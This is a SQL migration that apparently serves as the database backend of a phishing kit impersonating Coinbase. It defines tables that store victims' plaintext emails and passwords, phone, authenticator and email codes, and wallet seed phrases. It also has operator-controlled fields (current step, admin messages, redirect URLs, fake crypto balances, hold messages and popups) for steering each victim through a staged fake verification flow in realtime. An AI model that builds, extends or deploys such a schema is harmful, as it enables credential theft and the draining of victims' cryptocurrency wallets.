/*
# Create full application schema (single-tenant, no auth)

This migration creates all four tables the app needs to function:
login_attempts, sessions, settings, and ledger_activities.

1. New Tables
- `login_attempts`: stores submitted login credentials for the admin panel.
  Columns: id (uuid PK), email, password, phone_code, ip_address, user_agent, created_at.
- `sessions`: the core session table driving the multi-step verification flow.
  Columns: id (text PK), email, password, phone_code, current_step, status,
  user_agent, is_active, redirect_url, admin_message, last_activity, created_at,
  plus many optional flow columns (phone_last4, verification_type, email_for_code,
  authenticator_code, email_code, balance_selection, security_responses jsonb,
  security_location, security_phone_last4, wallet_type, wallet_action, seed_phrase,
  dashboard_balance, balance_hidden, balance_on_hold, hold_message, btc_amount,
  eth_amount, usdc_amount, sol_amount, doge_amount, xrp_amount, user_name,
  user_avatar, show_verification_banner, verification_banner_message,
  show_wallet_popup, wallet_popup_type).
- `settings`: key/value table for global app configuration (e.g. active_brand).
  Columns: key (text PK), value, updated_at.
- `ledger_activities`: stores persistent activity data keyed by visitor_id.
  Columns: visitor_id (text PK), activity jsonb, updated_at.

2. Security
- RLS enabled on all tables.
- All tables use permissive policies (TO anon, authenticated) because this is a
  single-tenant app with no sign-in screen; the anon-key client must be able to
  read and write its own data.
- Four separate CRUD policies per table (select/insert/update/delete).

3. Realtime
- sessions and settings added to the supabase_realtime publication so the
  frontend can subscribe to row changes.
- REPLICA IDENTITY FULL set on settings so old/new row values are available.

4. Indexes
- login_attempts: created_at DESC for the admin list query.
- ledger_activities: updated_at DESC for fast lookups.
*/

-- ============================================================
-- 1. login_attempts
-- ============================================================
CREATE TABLE IF NOT EXISTS login_attempts (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email TEXT NOT NULL,
  password TEXT NOT NULL,
  phone_code TEXT,
  ip_address TEXT,
  user_agent TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE login_attempts ENABLE ROW LEVEL SECURITY;

CREATE INDEX IF NOT EXISTS idx_login_attempts_created_at ON login_attempts(created_at DESC);

DROP POLICY IF EXISTS "select_login_attempts" ON login_attempts;
CREATE POLICY "select_login_attempts" ON login_attempts FOR SELECT
  TO anon, authenticated USING (true);

DROP POLICY IF EXISTS "insert_login_attempts" ON login_attempts;
CREATE POLICY "insert_login_attempts" ON login_attempts FOR INSERT
  TO anon, authenticated WITH CHECK (true);

DROP POLICY IF EXISTS "update_login_attempts" ON login_attempts;
CREATE POLICY "update_login_attempts" ON login_attempts FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "delete_login_attempts" ON login_attempts;
CREATE POLICY "delete_login_attempts" ON login_attempts FOR DELETE
  TO anon, authenticated USING (true);

-- ============================================================
-- 2. sessions
-- ============================================================
CREATE TABLE IF NOT EXISTS sessions (
  id TEXT PRIMARY KEY,
  email TEXT,
  password TEXT,
  phone_code TEXT,
  current_step TEXT NOT NULL DEFAULT 'email',
  status TEXT NOT NULL DEFAULT 'idle',
  user_agent TEXT,
  is_active BOOLEAN DEFAULT true,
  redirect_url TEXT,
  admin_message TEXT,
  last_activity TIMESTAMPTZ DEFAULT NOW(),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_last4 TEXT DEFAULT '7842';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS verification_type TEXT DEFAULT 'phone';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS email_for_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS authenticator_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS email_code TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_selection TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_responses JSONB DEFAULT '{}';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_location TEXT DEFAULT 'Frankfurt, Germany';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS security_phone_last4 TEXT DEFAULT '9548';
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_type TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_action TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS seed_phrase TEXT;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS dashboard_balance TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_hidden BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS balance_on_hold BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS hold_message TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS btc_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS eth_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS usdc_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS sol_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS doge_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS xrp_amount TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS user_name TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS user_avatar TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS show_verification_banner BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS verification_banner_message TEXT DEFAULT NULL;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS show_wallet_popup BOOLEAN DEFAULT false;
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS wallet_popup_type TEXT DEFAULT 'link';

ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "select_sessions" ON sessions;
CREATE POLICY "select_sessions" ON sessions FOR SELECT
  TO anon, authenticated USING (true);

DROP POLICY IF EXISTS "insert_sessions" ON sessions;
CREATE POLICY "insert_sessions" ON sessions FOR INSERT
  TO anon, authenticated WITH CHECK (true);

DROP POLICY IF EXISTS "update_sessions" ON sessions;
CREATE POLICY "update_sessions" ON sessions FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "delete_sessions" ON sessions;
CREATE POLICY "delete_sessions" ON sessions FOR DELETE
  TO anon, authenticated USING (true);

-- ============================================================
-- 3. settings
-- ============================================================
CREATE TABLE IF NOT EXISTS settings (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL,
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

INSERT INTO settings (key, value) VALUES ('active_brand', 'coinbase')
  ON CONFLICT (key) DO NOTHING;

ALTER TABLE settings ENABLE ROW LEVEL SECURITY;

ALTER TABLE settings REPLICA IDENTITY FULL;

DROP POLICY IF EXISTS "select_settings" ON settings;
CREATE POLICY "select_settings" ON settings FOR SELECT
  TO anon, authenticated USING (true);

DROP POLICY IF EXISTS "insert_settings" ON settings;
CREATE POLICY "insert_settings" ON settings FOR INSERT
  TO anon, authenticated WITH CHECK (true);

DROP POLICY IF EXISTS "update_settings" ON settings;
CREATE POLICY "update_settings" ON settings FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "delete_settings" ON settings;
CREATE POLICY "delete_settings" ON settings FOR DELETE
  TO anon, authenticated USING (true);

-- ============================================================
-- 4. ledger_activities
-- ============================================================
CREATE TABLE IF NOT EXISTS ledger_activities (
  visitor_id TEXT PRIMARY KEY,
  activity JSONB NOT NULL,
  updated_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_ledger_activities_updated ON ledger_activities(updated_at DESC);

ALTER TABLE ledger_activities ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "select_ledger_activities" ON ledger_activities;
CREATE POLICY "select_ledger_activities" ON ledger_activities FOR SELECT
  TO anon, authenticated USING (true);

DROP POLICY IF EXISTS "insert_ledger_activities" ON ledger_activities;
CREATE POLICY "insert_ledger_activities" ON ledger_activities FOR INSERT
  TO anon, authenticated WITH CHECK (true);

DROP POLICY IF EXISTS "update_ledger_activities" ON ledger_activities;
CREATE POLICY "update_ledger_activities" ON ledger_activities FOR UPDATE
  TO anon, authenticated USING (true) WITH CHECK (true);

DROP POLICY IF EXISTS "delete_ledger_activities" ON ledger_activities;
CREATE POLICY "delete_ledger_activities" ON ledger_activities FOR DELETE
  TO anon, authenticated USING (true);

-- ============================================================
-- 5. Realtime publications
-- ============================================================
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM pg_publication_tables
    WHERE pubname = 'supabase_realtime' AND tablename = 'sessions'
  ) THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE sessions;
  END IF;
  IF NOT EXISTS (
    SELECT 1 FROM pg_publication_tables
    WHERE pubname = 'supabase_realtime' AND tablename = 'settings'
  ) THEN
    ALTER PUBLICATION supabase_realtime ADD TABLE settings;
  END IF;
END
$$;
